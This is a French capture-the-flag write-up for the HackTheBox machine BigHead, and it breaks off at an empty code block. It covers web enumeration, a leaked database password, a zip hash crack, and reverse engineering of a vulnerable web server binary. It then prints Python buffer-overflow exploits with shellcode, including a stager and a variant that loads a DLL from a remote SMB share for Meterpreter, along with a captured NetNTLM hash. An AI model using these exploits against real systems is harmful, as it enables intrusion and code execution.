# Solution du CTF BigHead de HackTheBox

Concise scan is concise
-----------------------

```plain
Nmap scan report for 10.10.10.112
Host is up (0.031s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0
```

Pas trop de choix, on dirige ici notre browser sur 10.10.10.112 et on tombe sur la page d'une entreprise nommée *Pied Piper* qui annonce l'arrivée d'une nouvelle crypto-monnaie (*PiedPiperCoin*).  

Il y a sur la page des profils de divers employés fictifs, j'ai préféré relever les noms, prénoms et mots clés qui pourraient alimenter une wordlist, juste au cas où.  

La page dispose aussi d'un formulaire de contact vers un domaine *mailer.bighead.htb*.  

![BigHead mailer form](https://github.com/devl00p/blog/raw/master/images/htb/bighead_mailer.png)

 Il y a aussi une adresse email en *@bachmanity.htb*. Cela nous donne donc deux domaines possibles à énumérer.  

Pour cela on peut reprendre la méthodologie employée [pour le CTF Bart](http://devloop.users.sourceforge.net/index.php?article166/solution-du-ctf-bart-de-hackthebox).  

Auparavant on peut lancer un petit buster de fichiers/dossiers sur la racine web mais les résultats sont bien minces :  

```plain
http://10.10.10.112/images/ - HTTP 403 (0 bytes, gzip/chunked)
http://10.10.10.112/assets/ - HTTP 403 (0 bytes, gzip/chunked)
http://10.10.10.112/backend/ - HTTP 302 (161 bytes, plain) redirects to http://10.10.10.112/BigHead
```

Inutile d'insister, passons tout de suite aux sous-domaines pour *bighead.htb* :  

```plain
$ patator http_fuzz url="http://10.10.10.112/" method=GET header="Host: FILE0.bighead.htb" 0=/usr/share/sublist3r/subbrute/names.txt -x ignore:size=11378 -x ignore:size=11373
17:48:24 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-11-25 17:48 CET
17:48:24 patator    INFO -
17:48:24 patator    INFO - code size:clen       time | candidate                          |   num | mesg
17:48:24 patator    INFO - -----------------------------------------------------------------------------
17:48:35 patator    INFO - 200  13606:13456   10.001 | dev                                |    22 | HTTP/1.1 200 OK
17:48:42 patator    INFO - 302  370:161        0.685 | mailer                             |   484 | HTTP/1.1 302 Moved Temporarily
17:48:51 patator    INFO - 302  235:0          0.977 | code                               |   710 | HTTP/1.1 302 Found
```

L'idée ici est d'envoyer des sous-domaines possibles dans l'entête *Host* de notre requête HTTP et de voir si on obtient en retour une page dont la taille est différente de celle par défaut.  

Pour ignorer les réponses par défaut, *Patator* offre différentes possibilités comme la recherche d'un mot dans la page, la taille mentionnée par l'entête *Content-Length* (méthode employée ici) ou le nombre de caractères présents dans la page...  

Comme source de noms de sous-domaines on emploie une wordlist de l'outil *sublist3r*.  

Une fois nos trois sous-domaines trouvés j'ai commencé à fouiller sur *code.bighead.htb*. L'index de ce site tente de nous rediriger vers *http://127.0.0.1:5080/testlink/login.php*.  

Si on substitue le 127.0.0.1:5080 par le sous domaine *code.bighead.htb* on parvient sur une bonne quantité de messages d'erreur PHP.  

Ce qui semble le plus intéressant dans la backtrace affichée c'est cette ligne qui révèle un chemin interne ainsi qu'un mot de passe :  

```plain
C:\xampp\apps\testlink\htdocs\third_party\adodb\drivers\adodb-mysqli.inc.php, 124,
Array ([argHostname] => localhost,[argUsername] => bn_testlink,[argPassword] => d471fff8a1,[argDatabasename] => bitnami_testlink,[persist] => ,[arr] => Array ([0] => 5,[1] => 0)))
```

Le serveur tricéphale
---------------------

Un buster quelconque (dirb, DirBuster, GoBuster, etc) remontera différents dossiers, la plupart sans grand intérêt.  

Il y a par exemple un *PHPMyAdmin* qui semble cassé (ne s'affiche pas correctement), des dossiers *dev*, *mail* et *xampp* vides ainsi que les dossiers scripts *server-status* et *server-info* qui sont étonnamment accessibles.  

La curiosité ici est que le *server-info* (spécifique à *Apache*, faut-il le rappeler), mentionne le serveur suivant :  

```plain
Apache/2.4.33 (Win32) OpenSSL/1.0.2o PHP/5.6.36 Server at 127.0.0.1 Port 5080
```

On est donc bien loin du *Nginx* initial, il y a du reverse proxy ou quelque chose du même acabit...  

Sous le dossier *testlink* vu plus tôt on trouve (toujours via un buster) différents dossiers et fichiers. Les plus intéressants sont :  

* Un fichier changelog mentionnant une version 1.9.17 de TestLink (il s'agit donc [d'une vrai application](http://www.testlink.org/))
* Le script *linkto.php* qui retourne une intéressante erreur d'inclusion (via la fonction *require\_once()*)
* Un dossier logs dont l'accès nous est refusé
* Un fichier *note* où un certain Dinesh insulte copieusement un collègue :

```plain
BIGHEAD! You F%*#ing R*#@*d!

STAY IN YOUR OWN DEV SUB!!!...

You have literally broken the code testing app and tools I spent all night building for Richard!

I don't want to see you in my code again!

Dinesh.
```

Concernant le dossier logs je trouve [assez facilement](http://forum.testlink.org/viewtopic.php?t=775) via *DuckDuckGo* le nom des fichiers de logs (*userlogX.log*).  

Le fichier *userlog0.log* contient clairement des traces d'une intrusion qui date du 18 septembre :  

```plain
[>>][5b8bfdb018519054420624][DEFAULT][/testlink/linkto.php][18/Sep/2 15:11:44]
        [18/Sep/2 15:11:44][WARNING][<nosession>][GUI]
                E_NOTICE
Undefined index: PiperCoinID - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
        [18/Sep/2 15:11:44][WARNING][<nosession>][GUI]
                E_WARNING
require_once(C:\xampp\php\pear): failed to open stream: Permission denied - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
[<<][5b8bfdb018519054420624][DEFAULT][/testlink/linkto.php][18/Sep/2 15:11:44][18/Sep/2 15:11:44][took 0.210302 secs]
[>>][5b8bfdc5ef851940237118][DEFAULT][/testlink/linkto.php][18/Sep/2 15:12:05]
        [18/Sep/2 15:12:06][WARNING][<nosession>][GUI]
                E_NOTICE
Undefined index: PiperCoinID - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
        [18/Sep/2 15:12:06][WARNING][<nosession>][GUI]
                E_WARNING
require_once(C:\xampp\php\pear): failed to open stream: Permission denied - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
[<<][5b8bfdc5ef851940237118][DEFAULT][/testlink/linkto.php][18/Sep/2 15:12:05][18/Sep/2 15:12:06][took 0.060086 secs]
[>>][5b8bfe0c70e54424473279][DEFAULT][/testlink/linkto.php][18/Sep/2 15:13:16]
        [18/Sep/2 15:13:16][WARNING][<nosession>][GUI]
                E_WARNING
require_once(&lt;?php system(&quot;id&quot;);?&gt;): failed to open stream: No such file or directory - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
[<<][5b8bfe0c70e54424473279][DEFAULT][/testlink/linkto.php][18/Sep/2 15:13:16][18/Sep/2 15:13:16][took 0.070101 secs]
[>>][5b8bfeb3bf2a7839433030][DEFAULT][/testlink/linkto.php][18/Sep/2 15:16:03]
        [18/Sep/2 15:16:03][WARNING][<nosession>][GUI]
                E_WARNING
require_once(): http:// wrapper is disabled in the server configuration by allow_url_include=0 - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
        [18/Sep/2 15:16:03][WARNING][<nosession>][GUI]
                E_WARNING
require_once(http://192.168.56.10/RFI.TXT): failed to open stream: no suitable wrapper could be found - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
[<<][5b8bfeb3bf2a7839433030][DEFAULT][/testlink/linkto.php][18/Sep/2 15:16:03][18/Sep/2 15:16:03][took 0.060087 secs]
[>>][5b8bfee0d8c41144646901][DEFAULT][/testlink/linkto.php][18/Sep/2 15:16:48]
        [18/Sep/2 15:16:48][WARNING][<nosession>][GUI]
                E_WARNING
require_once(): http:// wrapper is disabled in the server configuration by allow_url_include=0 - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
        [18/Sep/2 15:16:48][WARNING][<nosession>][GUI]
                E_WARNING
require_once(http://192.168.56.10/RFI.TXT): failed to open stream: no suitable wrapper could be found - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 56
[<<][5b8bfee0d8c41144646901][DEFAULT][/testlink/linkto.php][18/Sep/2 15:16:48][18/Sep/2 15:16:48][took 0.070101 secs]
[>>][5b8bffca89aaa533144150][DEFAULT][/testlink/linkto.php][18/Sep/2 15:20:42]
        [18/Sep/2 15:20:42][WARNING][<nosession>][GUI]
                E_WARNING
require_once(): http:// wrapper is disabled in the server configuration by allow_url_include=0 - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 58
        [18/Sep/2 15:20:42][WARNING][<nosession>][GUI]
                E_WARNING
require_once(http://192.168.56.10/RFI.TXT): failed to open stream: no suitable wrapper could be found - in C:\xampp\apps\testlink\htdocs\linkto.php - Line 58
[<<][5b8bffca89aaa533144150][DEFAULT][/testlink/linkto.php][18/Sep/2 15:20:42][18/Sep/2 15:20:42][took 0.070101 secs]
[>>][5b8c019adc1bf960550581][DEFAULT][/testlink/linkto.php][18/Sep/2 15:28:26]
[<<][5b8c019adc1bf960550581][DEFAULT][/testlink/linkto.php][18/Sep/2 15:28:26][18/Sep/2 15:28:26][took 0.060087 secs]
[>>][5b8c01c6ce3d2590535612][DEFAULT][/testlink/linkto.php][18/Sep/2 15:29:10]
        [18/Sep/2 15:29:10][WARNING][<nosession>][GUI]
                E_NOTICE
Undefined variable: POST - in C:\Users\Nelson\AppData\Local\Temp\shell.php - Line 1
        [18/Sep/2 15:29:10][WARNING][<nosession>][GUI]
                E_WARNING
system(): Cannot execute a blank command - in C:\Users\Nelson\AppData\Local\Temp\shell.php - Line 1.
```

Le fichier *userlog1.log* mentionne seulement un utilisateur de *teslink* nommé *dinesh*.  

Maintenant il faut voir que le TestLink installé est dans sa dernière version et qu'il ne semble pas y avoir de vulnérabilités liées. De plus le code de TestLink est sur Github et il n'y a clairement pas de *require\_once()* [à la ligne 56](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/testlink_1_9/linkto.php#L56).  

On peut en déduire que du code vulnérable a été inséré pour les besoins du challenge.  

Dans le fichier *userlog0.log* on voit mentionné différents noms de paramètres (*PiperCoinID*, *PiperCoinAuth*, *PiperCoinAvitar*) qui sont par déduction potentiellement vulnérables.  

Après avoir joué un peu à la mano avec ces variables passés au script *linkto.php* sans aboutir à quoi que ce soit, j'ai décidé de créer une wordlist de nom de paramètres suivant le même schéma.  

On peut trouver sur le web des dictionnaires [de noms de paramètres fréquents](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt), il suffit juste de capitaliser le nom et mettre *PiperCoin* au début :  

```python
with open("common_query_parameter_names.txt") as fd:
    with open("converted.txt", "w") as fd_out:
        for line in fd:
            word = "PiperCoin" + line.strip().capitalize()
            print(word, file=fd_out)
```

Il ne reste qu'à utiliser *Patator* pour tester chaque paramètre avec une valeur quelconque :  

```bash
patator http_fuzz url='http://code.bighead.htb/testlink/linkto?FILE0=nawak' 0=converted.txt -x ignore:size=945
```

Ce qui ne m'a amené nul part, pourtant je n'étais pas si loin du but comme on le verra plus tard.  

Faute de mieux (on a tout de même quelques infos utiles) on bouge sur le sous-domaine *dev* qui se montre lui aussi surprenant. Par exemple quand on questionne le path /coffee trouvé avec un buster :  

```html
$ curl -D- http://dev.bighead.htb/coffee/
HTTP/1.1 418 I'm A Teapot!
Date: Wed, 28 Nov 2018 19:21:43 GMT
Content-Type: text/html
Content-Length: 46
Connection: keep-alive
Server: BigheadWebSvr 1.0

<center><img src='../teapot.gif' width='75%'>
```

What the fsck ? BigheadWebSrv kezako ?  

Il aura fallut qu'on m'indique de fouiller sur Github pour obtenir la solution : le créateur du CTF a en effet créé [un répo sur Github spécifique au challenge](https://github.com/3mrgnc3/BigheadWebSvr)...  

Je trouve ça dommage d'avoir à faire ce genre de recherches, d'une part parce que sur un boot2root on s'attend pas à ce genre d'étapes (c'est plutôt *batteries included*), d'autre part on a un sous-domaine qui s'appelle ici *code* et un dossier qui s'appelait *dev*... autant dire que ça aurait du être l'emplacement des fichiers en question.  

Ce dépôt a eu 4 commits dont deux concernent un fichier *BHWS\_Backup.zip*.  

Cette archive zip contient des fichiers protégés par mot de passe. On peut utiliser l'utilitaire *zip2john* (présent avec la version Jumbo de JTR) qui permet d'obtenir un hash à casser :  

```plain
$ zip2john BHWS_Backup.zip
 BHWS_Backup.zip->BHWS_Backup/ is not encrypted!
 BHWS_Backup.zip->BHWS_Backup/conf/ is not encrypted!
 BHWS_Backup.zip:$zip2$*0*3*0*231ffea3729caa2f37a865b0dca373d7*d63f*49*61c6e7d2949fb22573c57dec460346954bba23dffb11f1204d4a6bc10e91b4559a6b984884fcb376ea1e2925b127b5f6721c4ef486c481738b94f08ac09df30c30d2ae3eb8032c586f*28c1b9eb8b0e1769b4d3*$/zip2$:::::BHWS_Backup.zip
```

Et pour casser ce hash :  

```plain
$ john --wordlist=/opt/wordlists/rockyou.txt hash.txt
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 8x SSE2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thepiedpiper89   (BHWS_Backup.zip)
1g 0:00:11:42 DONE 0.001422g/s 4632p/s 4632c/s 4632C/s thetrio16..thefrenchman_05
Session completed
```

Pour la précédente version de l'archive le mot de passe est simplement *bighead*. La seule différence importante entre les deux versions est que l'ancienne archive contient un binaire *BigheadWebSvr.exe* qui au vu des chaînes de caractères qu'il renferme (ex: *Server: BigheadWebSvr 1.0*) va concentrer toute notre attention pour la suite du challenge (il y a aussi une DLL *bHeadSvr.dll*).  

Giving head may induce overflow
-------------------------------

Pour la suite de l'article les images du code seront des screenshots de l'interface [Cutter](https://github.com/radareorg/cutter/releases) pour *Radare2*.  

Dans le main (*sym.\_main*) on trouve les étapes classiques de la création d'une socket d'écoute avec *WSAStartup*, *bind* et *accept*.  

Pour chaque client connecté un nouveau thread est lancé (via *CreateThread*) avec la fonction *sym.\_ConnectionHandler* qui reçoit le descripteur de socket retourné par *accept()*.  

![BigHead CTF CreateThread](https://github.com/devl00p/blog/raw/master/images/htb/bighead_create_thread.png)

La première chose que fait cette fonction, en dehors de réserver 1080 octets sur la pile, c'est allouer deux buffer sur le tas, l'un de 524 (*s1*) et l'autre de 1024 octets.  

![BigHead CTF handler function init](https://github.com/devl00p/blog/raw/master/images/htb/bighead_handler_init.png)

Le buffer de 524 est utilisé pour stocker les données reçues par *recv()* qui tente justement de lire 524 octets.  

![BigHead CTF handler recv](https://github.com/devl00p/blog/raw/master/images/htb/bighead_handler_recv.png)

Juste après cela on a le premier point vraiment intéressant : la quantité de données obtenues via *recv()* est comparée à 219 (0xdb).  

![BigHead CTF request length check](https://github.com/devl00p/blog/raw/master/images/htb/bighead_recv_length_check.png)

Si la taille est supérieure alors on part vers différents embranchements qui regarderont si la requête est :  

* Un GET /coffee
* Un GET quelconque
* Un POST

Aucun ne ces embranchements n'a d'intérêt puisqu'ils retournent tous une réponse hardcodée...  

La seule partie intéressante du binaire est le traitement des requêtes HEAD dont le cas où les données reçues sont inférieures ou égales à 219 octets.  

D'abord le code initialise certaines données avant d'entrer dans une boucle :  

![CTF BigHead strtoul loop init](https://github.com/devl00p/blog/raw/master/images/htb/bighead_strtoul_loop_init.png)

On a :  

* Une chaîne nommée *str* d'une taille de seulement 3 octets initialisée avec des octets nuls
* Un buffer d'une taille de 12 octets alloué sur le tas (*local\_2ch*)
* Un compteur initialisé à 0 (local\_10h)
* Un offset initialisé à 6 (soit l'équivalent du nombre de caractères pour un *"HEAD /"*)

C'est maintenant que ça devient plus compliqué mais pour faire simple le code lit les caractères depuis *s1* (obtenus lors du *recv()*) deux à deux.  

![CTF BigHead strtoul loop](https://github.com/devl00p/blog/raw/master/images/htb/bighead_strtoul_loop.png)  

Dès que l'un des deux caractères est un octet nul la boucle s'arrête.  

Dans le cas contraire les deux caractères sont placés dans *str* et *strtoul()* et appelée pour convertir les caractères en entier non signé en utilisant la base 16.  

C'est l'équivalent d'un *binascii.unhexlify* en *Python 3* : juste du décodage hexa !  

Le résultat de ce décodage est stocké dans *local\_2ch* de taille 12, sauf que... il n'y a aucune vérification faite pour empêcher de déborder.  

Maintenant, on pourrait penser que la faille est là, mais si on regarde la *Function4* qui traite notre buffer hex-décodé on voit un beau *strcpy* des familles :  

![BigHead strcpy vulnerability CTF](https://github.com/devl00p/blog/raw/master/images/htb/bighead_strcpy.png)

Ici l'espace alloué sur la pile est de 56 (0x38) octets. Cela signifie que notre buffer initial doit dépasser 112 caractères (56 \* 2) pour écraser l'adresse de retour et qu'on doit hex-encoder notre payload pour qu'il passe.  

On comprend mieux pourquoi le CTF s'appelle *BigHead* : il va falloir envoyer une requête HEAD suffisamment grosse pour contrôler le flot d'exécution du programme.  

L'analyse de la DLL n'apportera rien de plus concernant la faille de sécurité mais on y trouve des suites d'instructions parfaites pour fiabiliser l'exploitation (*call eax*, *call edx*, *jmp esp*, *jmp ebx*, *jmp edi*, etc. et différents *pop/pop/pop/ret* pour du [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming))  

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA etc
-------------------------------------------

C'est le moment de se pencher sur l'exploitation de cette vulnérabilité et vu que le binaire semble avoir été compilé avec *MingW* il ne devrait pas y avoir de protections particulières.  

Cela est confirmé avec *rabin* (le copain de *Botman* ?) :  

```plain
$rabin2 -I BigheadWebSvr.exe
arch     x86
binsz    51431
bintype  pe
bits     32
canary   false
class    PE32
cmp.csum 0x0001a722
compiled Mon Jul  2 22:33:50 2018
crypto   false
endian   little
havecode true
hdr.csum 0x0001a722
linenum  true
lsyms    false
machine  i386
maxopsz  16
minopsz  1
nx       false
os       windows
overlay  true
pcalign  0
pic      false
relocs   true
signed   false
static   false
stripped true
subsys   Windows CUI
va       true
```

Etant donné que l'on dispose du binaire et sa DLL il suffit de copier les exécutables dans une VM Windows, de les exécuter et de commencer à jouer avec notre requête HEAD.  

La première exécution nous signale l'absence de DLLs spécifiques à MingW. Pour ne pas avoir à installer trop de choses on peut se contenter d'un [MSYS](http://mingw.org/wiki/msys) qui fournira les DLL nécessaire et une console à partir de laquelle lancer le serveur.  

Je commence par un simple script Python qui me permettra de provoquer le crash et d'analyser le contexte à ce moment :  

![BigHead crash in ImmunityDebugger](https://github.com/devl00p/blog/raw/master/images/htb/bighead_crash.png)

Bonne nouvelle, non seulement on écrase bien EIP (en rouge sur la capture) mais en plus EAX (en blanc) pointe sur le début de notre requête, juste après le *HEAD /* (c'est raccord avec l'analyse précédente).  

L'autre excellente nouvelle c'est qu'après plusieurs tests j'ai remarqué que EBX avait une petite valeur, généralement fixe, et en fouillant un peu j'ai compris qu'il s'agissait du descripteur de la socket client ! Et aussi EDI vaut 0 ce qui peut toujours être utile :)  

On calcule qu'il faut 6 octets (pour *HEAD /*) + 64 octets + 8 octets pour écraser EBP soit 78 octets avant d'écraser EIP.  

On n'a pas utilisé la totalité du buffer autorisé pour une requête HEAD mais dans la logique on a 219 - 78 - 8 (adresse de retour) = 133 octets utilisables après l'adresse de retour.  

Le tout est à diviser par deux si on considère la taille de notre shellcode. On pourra si le besoin se fait sentir faire un saut par dessus l'adresse de retour pour utiliser pleinement l'espace autorisé.  

Le dernier point à prendre en considération c'est qu'on aura potentiellement à rajouter certains octets pour rendre notre requête plus conforme au protocole HTTP (on aura de toute évidence besoin de spécifier l'entête *Host* ce qui implique HTTP en version 1.1).  

Writing exploit for fun and uselessness
---------------------------------------

Du coup il nous suffit d'utiliser comme adresse de retour un *jmp eax* trouvé dans la DLL. Pour tester on mettra au début de notre requête une instruction [INT 3](https://en.wikipedia.org/wiki/INT_%28x86_instruction%29#INT_3) (opcode CC) et on adaptera le code Python ainsi :  

```python
import socket
from binascii import hexlify
import struct

TARGET = '127.0.0.1'
PORT = 8008
jmp_eax = 0x625012F2  # JMP EAX from bHeadSvr.dll

sock = socket.socket()
sock.connect((TARGET, PORT))

buff = "HEAD /"
buff += "CC"
buff += "A" * 70
buff += hexlify(struct.pack("I", jmp_eax)).decode()

sock.send(buff.encode())
```

![BigHead CTF jmp eax to int 3](https://github.com/devl00p/blog/raw/master/images/htb/bighead_jmp_eax_cc.png)

On voit ici que l'on atteint bien notre instruction, preuve que la pile est exécutable et qu'on pourra mettre notre shellcode :)  

La technique que j'ai choisi consiste à envoyer un stager qui va profiter du fait que l'adresse de *recv()* est disponible et que le descripteur de socket est dans un registre.  

Le stager ne fait qu'appeler *recv()* pour recevoir un second shellcode qui sera écrit sur la stack puis sautera dessus.  

Le second shellcode a (de mémoire) été généré par Metasploit (le genre *WinExec*) et a l'avantage d'être facilement modifiable (chaîne du programme à exécuter en fin de shellcode).  

Je vous épargne les explications détaillées du code assembleur mais si les shellcodes vous intéressent vous pouvez aussi lire mon article [Solution du Cyber-Security Challenge Australia 2014 (Shellcoding)](http://devloop.users.sourceforge.net/index.php?article116/solution-du-cyber-security-challenge-australia-2014-shellcoding).  

Pour obtenir les opcodes des instructions assembleur j'ai utilisé *rasm2* (qui fait partie de *radare2*).  

```python
import socket
import struct
from binascii import hexlify
from time import sleep

TARGET = '127.0.0.1'
PORT = 8008

jmp_eax = 0x625012F2  # JMP EAX from bHeadSvr.dll
sock = socket.socket()
sock.connect((TARGET, PORT))

print("Sending first stage...")
shellcode = "/90"          # change to /CC for debuging
shellcode += "EB32"        # jmp +52 (jump to relative call)
shellcode += "59"          # pop ecx (stack address)
shellcode += "89DA"        # mov edx, ebx (socket)
shellcode += "83EC20"      # sub esp, 32
shellcode += "57"          # push edi (0 = recv flags)
shellcode += "6BDB05"      # imul ebx, 5 (ebx = 620)
shellcode += "53"          # push ebx (recv length)
shellcode += "89CB"        # mov ebx, ecx (ecx is fucked by recv, keep address here)
shellcode += "51"          # push ecx (recv buffer)
shellcode += "52"          # push edx
shellcode += "B8AA781D40"  # mov eax, 0x401D78AA
shellcode += "C1E808"      # shr eax, 8 (eax = recv)
shellcode += "FFD0"        # call eax
shellcode += "FFE3"        # jmp ebx
padding = 73 - len(shellcode)
print(padding, "characters of padding were added")
shellcode += "C" * padding

buff2 = "90" * 13
buff2 += "E8C9FFFFFF" # call -50

buff = "HEAD " + shellcode + hexlify(struct.pack("I", jmp_eax)).decode() + buff2

sock.send(buff.encode())

sleep(.1)
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
buf += b"\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += b"\xff\xd5"
buf += b"C:\\Windows\\system32\\mspaint.exe"
buf += b"\x00"

print("Sending second stage...")
sock.send(buf)
sock.close()
```

Et ça marche en local !  

Plus qu'à voir si on peut adapter ça pour les conditions du challenge. L'archive présente sur le *Github* contient différents fichiers de configuration *Nginx* sur lesquels on va devoir se pencher :)  

Ce qui nous intéresse le plus c'est ceci :  

```plain
location / {
    # Backend server to forward requests to/from
    proxy_pass          http://127.0.0.1:8008;
    proxy_cache_convert_head off;
    proxy_cache_key $scheme$proxy_host$request_uri$request_method;
    proxy_http_version  1.1;

    # adds gzip
    gzip_static on;
}
```

La documentation de Nginx n'est pas très parlante quand au fonctionnement interne de la directive *proxy\_pass* mais en fouillant un peu sur *StackOverflow* on voit que le comportement par défaut consiste à faire du buffering, du coup notre exploit tombe à l'eau car il n'y a pas de moyen de laisser ouverte la connexion entre le Nginx et le binaire vulnérable.  

On peut facilement reproduire l’environnement du CTF en récupérant [Nginx pour Windows](https://nginx.org/en/docs/windows.html) et en recopiant le *nginx.conf*.  

On peut voir ainsi que si on chaîne deux requêtes en keep-alive sur le *Nginx* (par exemple en Python avec le système de session du module requests) :  

![BigHead CTF Nginx Keep-Alive Wireshark capture](https://github.com/devl00p/blog/raw/master/images/htb/bighead_keep_alive.png)

Et bien malgré tout nos requêtes sont transformées en deux streams TCP différents et *Nginx* ajoute un entête *Connection: close*  

![BigHead CTF Nginx proxy_pass Connection: Close Wireshark capture](https://github.com/devl00p/blog/raw/master/images/htb/bighead_cnx_close.png)

Il semble qu'aucun bypass ne soit possible en raison du buffering, pas même l'emploi d'un transfert [chunked](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)...  

Il va donc falloir trouver une autre solution :-/   

Mais sinon ça crashe...
-----------------------

Le second exploit que j'ai tenté ce concentrait donc sur le fait de tout faire en une seule passe (inline). La méthode employée ici est simplement d'avoir recours à *LoadLibraryA* qui fait partie des fonctions importées par le binaire.  

```python
import socket
import struct
from binascii import hexlify
from time import sleep

TARGET = '127.0.0.1'
PORT = 80

jmp_eax = 0x625012F2  # JMP EAX from bHeadSvr.dll
sock = socket.socket()
sock.connect((TARGET, PORT))

print("Sending first stage...")
shellcode = "/90"          # change to /CC for debuging
shellcode += "EB25"        # jmp +39 (jump to relative call)
shellcode += "58"          # pop eax (stack address)
shellcode += "83ec40"      # sub esp, 64
shellcode += "89e5"        # mov ebp, esp
shellcode += "89ea"        # mov edx, ebp
shellcode += "89ee"        # mov esi, ebp
shellcode += "50"          # push eax
shellcode += "B8AA681340"  # mov eax, 0x401368aa
shellcode += "C1E808"      # shr eax, 8 (eax = LoadLibraryA)
shellcode += "FFE0"        # jmp eax
shellcode += "1" * (73 - len(shellcode))

buff2 = "E8D6FFFFFF" # call instruction après le jmp
buff2 += hexlify(b"\\\\vboxsrv\\shared\\msf.dll").decode()

buff = "HEAD " + shellcode + hexlify(struct.pack("I", jmp_eax)).decode() + buff2
buff += " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n"
print("buff length is", len(buff))

sock.send(buff.encode())
sleep(1)
sock.close()
```

Le problème que j'ai eu avec cette technique est quelle était extrêmement instable.  

Premièrement, ça fonctionne uniquement à la première exécution. Sans doute parce qu'une fois la DLL chargée dans la mémoire du process le système refuse de la remapper (?) mais le souci persistait même en renommant la DLL.  

Ensuite j'ai eu des souci de violation d'accès lors de l'écriture de l'exploit car *LoadLibraryA* tentait de lire une adresse mémoire sur la stack. C'est fonction n'est pourtant sensée recevoir qu'un seul argument...  

J'ai tenté de changer les registres utilisés dans le shellcode, bouger *esp/ebp* sans obtenir d'excellents résultats.  

Pour terminer, lors de l'utilisation de l'exploit sur le CTF ma session *Meterpreter* était tuée à peine ouverte et aussitôt relancée et tuée... Je me faisait flooder de sessions *Meterpreter* morte-nées.  

J'ai hâte de savoir si d'autres participants ont utilisé cette technique avec succès.  

Bon point cependant : puisque le système accédait à mon partage SMB pour charger la DLL je pouvais capturer le hash NetNTLM :) Certes je n'ai pas réussi à le casser et je n'aurais pas pu l'utiliser en raison des ports Windows inaccessibles :p  

```plain
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.112,49986)
[*] AUTHENTICATE_MESSAGE (PIEDPIPER\Nelson,PIEDPIPER)
[*] User Nelson\PIEDPIPER authenticated successfully
[*] Nelson::PIEDPIPER:4141414141414141:e51986da0b07efb41cfbac181b640cd3:010100000000000080d214e08890d4016d9a7f15a2cedd2e0000000001001000740069006c006900440074006b0055000200100073007a00500041006400640057005a0003001000740069006c006900440074006b0055000400100073007a00500041006400640057005a000700080080d214e08890d40106000400020000000800300030000000000000000000000000200000b4d3d270bf5dba3dbfb0d467472095c4a2c7f26009f9adcd4ab6da49d7ed369c000000000000000000000000
[*] Disconnecting Share(1:IPC$)
```

Humpty Dumpty
-------------

La méthode vraisemblablement attendue pour le challenge est d'utiliser un egghunt.  

Cette technique est généralement employée quand on ne dispose pas d'assez de place pour placer un shellcode long mais qu'on a la possibilité d'insérer dans la mémoire du processus (à une adresse inconnue) des données à nous.  

Le egghunt qui est un shellcode de petite taille va chercher le shellcode de longue taille en explorant la mémoire du processus et l'exécuter s'il le trouve.  

Ici on sait que les données récupérées par *recv()* sont stockées dans des buffers alloués sur le tas et si on regarde mieux le code on voit qu'il n'y a pas de *free()* associé : l'espace mémoire n'est donc pas libéré !  

J'ai du faire face ici à deux difficultés :   

* Je ne voulais pas explorer la totalité de la mémoire du process (4Go ça fait beaucoup) surtout que l'on sait que l'on doit chercher sur le tas
* Le egghunt plantait car il se trouvait lui même. Il faut donc que le tag (octets servant d'identifiant pour reconnaître le début du shellcode) ne soit pas présent tel quel dans le egghunt

Ces problématiques ont été adressées de cette façon :  

* On sait que le thread fait des *malloc()/memset()* donc on s'attend à trouver un pointeur vers une zone alloué en remontant la pile. En l’occurrence un *pop* suffit :D
* Pour le tag il suffit d'avoir sa valeur - 1 dans le egghunt et de l'incrémenter en assembleur avant de le rechercher

Cela nous donne l'exploit suivant :  

```python
